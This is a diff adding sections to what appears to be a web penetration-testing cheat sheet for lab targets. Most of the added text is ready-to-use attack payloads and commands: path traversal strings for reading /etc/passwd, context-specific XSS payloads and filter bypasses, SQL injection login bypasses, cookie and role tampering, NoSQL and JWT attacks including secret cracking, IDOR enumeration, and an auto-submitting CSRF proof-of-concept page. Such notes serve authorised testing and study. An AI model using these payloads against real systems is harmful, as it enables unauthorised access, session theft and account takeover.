@@ -545,6 +545,21 @@ locale=
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
 ```
 
+More bypasses:
+```text
+..%252f..%252f..%252fetc%252fpasswd          Double URL encoding
+....\/....\/....\/etc/passwd                 Mixed separators
+/var/www/html/../../../etc/passwd            App requires a fixed path prefix
+../../../../etc/passwd%00.pdf                Null byte (PHP < 5.3.4) when an extension is appended
+../../../../etc/passwd%00
+```
+
+curl normalises `../` before sending — use `--path-as-is` (or Burp Repeater):
+```bash
+curl -s --path-as-is "http://SERVER_IP:PORT/download?file=../../../../etc/hostname"
+curl -s -G "http://SERVER_IP:PORT/download" --data-urlencode "file=../../../../etc/hostname"
+```
+
 Useful Linux files:
 ```text
 /etc/passwd
@@ -944,6 +959,31 @@ Payload where `<script>` tags are not allowed
 <img src="" onerror=alert(document.cookie)>
 ```
 
+Find which parameter reflects (inject a unique marker into every param, then grep the response):
+```bash
+curl -s "http://SERVER_IP:PORT/search?q=xssmark1&category=xssmark2&sort=xssmark3" | grep -n xssmark
+```
+Hidden params can be found with the ffuf parameter fuzzing in section 2. View source around the marker to see the context.
+
+Payloads by reflection context:
+```text
+Between tags          <script>alert(1)</script>   <svg onload=alert(1)>
+Inside attribute ""   "><script>alert(1)</script>   " autofocus onfocus=alert(1) x="
+Inside attribute ''   '><svg onload=alert(1)>
+Inside <textarea>     </textarea><script>alert(1)</script>
+Inside <title>        </title><script>alert(1)</script>
+Inside JS string ''   ';alert(1);//      '-alert(1)-'
+Inside JS string ""   ";alert(1);//
+Inside href / src     javascript:alert(1)
+Filter bypasses       <ScRiPt>alert(1)</sCrIpT>   <scr<script>ipt>alert(1)</script>   <body onload=alert(1)>
+```
+
+Confirm reflection unencoded from the CLI:
+```bash
+curl -s -G "http://SERVER_IP:PORT/search" --data-urlencode 'q=<script>alert(1)</script>' | grep -F '<script>alert(1)</script>'
+```
+If the response contains `&lt;script&gt;` it is encoded (not vulnerable in that context). Prove execution in a browser — the alert box must pop.
+
 XSS Discovery with `XSS Strike`
 ```bash
 git clone https://github.com/s0md3v/XSStrike.git
@@ -976,3 +1016,180 @@ if (isset($_GET['c'])) {
 }
 ?>
 ```
+
+## 12) Information Disclosure
+Headers and fingerprinting:
+```bash
+curl -sI http://SERVER_IP:PORT/
+whatweb -a 3 http://SERVER_IP:PORT/
+nikto -h http://SERVER_IP:PORT/
+```
+
+Headers that leak versions:
+```text
+Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/7.4.3 | Express | ASP.NET | Next.js
+X-AspNet-Version: 4.0.30319
+X-AspNetMvc-Version: 5.2
+Server: Werkzeug/2.0.1 Python/3.8.10      (Flask)
+X-Generator: Drupal 8
+```
+
+Trigger error pages / stack traces:
+```text
+/doesnotexist12345                 404 page often shows framework + version
+?id='                              SQL / framework error
+?id[]=1                            Type error in PHP / Rails
+?id=%00   or a very long value
+Unsupported method (e.g. PUT, TRACE)
+```
+
+Diagnostic / debug endpoints:
+```text
+/phpinfo.php  /info.php  /test.php               PHP version, modules, paths, env
+/server-status  /server-info                     Apache mod_status / mod_info
+/.env  /.git/HEAD  /composer.json  /package.json Secrets and dependency versions
+/actuator  /actuator/env  /actuator/info         Spring Boot
+/console                                         Werkzeug debugger (Flask) → RCE if unlocked
+/elmah.axd  /trace.axd                           ASP.NET
+/_profiler  /app_dev.php                         Symfony
+/debug  /debug/vars  /status  /health  /metrics  /swagger  /api-docs
+```
+
+Framework tells in debug pages:
+```text
+Django DEBUG=True          Yellow error page listing "Django Version: x.y"
+Laravel                    Ignition / Whoops page, "Laravel vX" in footer
+Spring Boot                "Whitelabel Error Page"
+ASP.NET                    Yellow screen: "Version Information: ... ASP.NET Version: x"
+Rails                      "Action Controller: Exception caught" + Rails version
+```
+
+```bash
+ffuf -u http://SERVER_IP:PORT/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -mc 200,301,302,403
+```
+
+## 13) Cookie and Session Security
+Capture `Set-Cookie` after logging in:
+```bash
+curl -si -X POST http://SERVER_IP:PORT/login -d 'username=USER&password=PASS' | grep -i '^set-cookie'
+```
+
+Browser: DevTools → Application/Storage → Cookies shows HttpOnly / Secure / SameSite columns. Burp: check the login response headers.
+
+| Attribute | Protects against | Missing means |
+|---|---|---|
+| `Secure` | Cookie sent over cleartext HTTP | Session can be sniffed over HTTP |
+| `HttpOnly` | JavaScript reading the cookie | XSS can steal `document.cookie` |
+| `SameSite=Lax/Strict` | Cross-site requests carrying the cookie | CSRF easier |
+| `Expires` / `Max-Age` | Long-lived sessions | Session cookie (dies with browser) — usually fine |
+| `Domain` / `Path` | Over-broad scope | Sent to sibling subdomains / paths |
+
+Example:
+```text
+Set-Cookie: PHPSESSID=8f2c...; path=/
+  -> Missing: Secure, HttpOnly, SameSite
+Set-Cookie: session=abc; Path=/; HttpOnly
+  -> Missing: Secure, SameSite
+```
+Note: `SameSite=None` is only honoured with `Secure`. Check every `Set-Cookie` header, not just the first.
+
+Other session checks:
+```text
+Session ID unchanged after login          Session fixation
+Decodable / sequential session ID         echo 'COOKIE' | base64 -d ; compare two sessions
+Session still valid after logout          Replay old cookie with curl
+Session ID in URL                         Leaks via Referer / logs
+```
+
+## 14) Authentication Bypass
+Work through in order:
+
+1. SQLi in login (see section 4):
+```text
+admin'-- -
+admin' #
+' OR 1=1-- -
+' OR '1'='1' LIMIT 1-- -
+") OR ("1"="1
+admin')-- -
+```
+
+2. Default / weak creds: `admin:admin`, `admin:password`, `admin:admin123`, `root:root`, `test:test`, product defaults (search "<product> default password"). Brute with hydra (section 3).
+
+3. Forced browsing / Execution After Redirect — `curl` does not follow redirects, so the protected page body may leak:
+```bash
+curl -si http://SERVER_IP:PORT/admin/dashboard.php
+curl -si http://SERVER_IP:PORT/admin/
+```
+
+4. Cookie / parameter tampering:
+```text
+Cookie: admin=0 -> admin=1      role=user -> role=admin      isAdmin=false -> true
+Hidden form field: <input type="hidden" name="role" value="user">
+Base64 / URL-encoded cookie:  echo 'dXNlcj1ndWVzdA==' | base64 -d   ->  user=guest  ->  re-encode user=admin
+```
+```bash
+curl -si http://SERVER_IP:PORT/dashboard -H 'Cookie: role=admin'
+```
+
+5. Response manipulation (client-side checks): in Burp intercept the login response and change `{"success":false}` → `true`, or `401`/`302 /login` → `200`. Also read the page JavaScript for hardcoded credentials or client-side-only checks.
+
+6. Type juggling / NoSQL:
+```text
+username=admin&password[]=x                          PHP strcmp() returns NULL == 0
+{"username":"admin","password":{"$ne":null}}         MongoDB
+username=admin&password[$ne]=x
+{"username":"admin","password":true}                 Loose comparison
+```
+
+7. JWT:
+```bash
+echo 'TOKEN' | cut -d. -f2 | base64 -d 2>/dev/null     # Inspect claims (add = padding if needed)
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt         # Crack weak HS256 secret
+jwt_tool TOKEN -X a                                               # alg:none attack
+jwt_tool TOKEN -T                                                 # Tamper claims (e.g. "role":"admin")
+```
+
+8. Header / verb tricks:
+```text
+X-Forwarded-For: 127.0.0.1          IP allow-listed admin panels
+X-Original-URL: /admin              Front-end path filtering
+HEAD / PUT / POST instead of GET    Basic auth only applied to GET
+/ADMIN  /admin/.  //admin  /admin;/  /%61dmin   Path normalisation
+```
+
+9. Password reset / registration logic: token returned in response, predictable token, `username` / `email` parameter changeable in the reset request, register `admin ` (trailing space) or `Admin`.
+
+## 15) IDOR
+```text
+/profile?id=1001 -> 1000, 1          /api/users/5 -> /api/users/1
+/download?file=invoice_1001.pdf      /orders/1001
+Encoded IDs: base64(id), md5(id), UUIDs leaked elsewhere in the app
+```
+```bash
+ffuf -u 'http://SERVER_IP:PORT/api/users/FUZZ' -w <(seq 1 1000) -H 'Cookie: session=VALUE' -fs SIZE
+echo -n 1 | md5sum                    # Generate hashed IDs
+```
+Test with two accounts: request user B's object with user A's session. Also try changing `user_id` in POST/PUT bodies and switching GET to PUT/DELETE.
+
+## 16) CSRF
+Vulnerable when a state-changing request has no unpredictable token and the cookie lacks `SameSite`.
+
+Checks:
+```text
+Remove the csrf_token parameter        Still accepted?
+Use another user's token / blank token Still accepted?
+Change POST to GET                     Still accepted?
+```
+
+PoC:
+```html
+<html><body>
+<form action="http://SERVER_IP:PORT/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.test">
+</form>
+<script>document.forms[0].submit();</script>
+</body></html>
+```
+Burp Pro: right-click request → Engagement tools → Generate CSRF PoC.
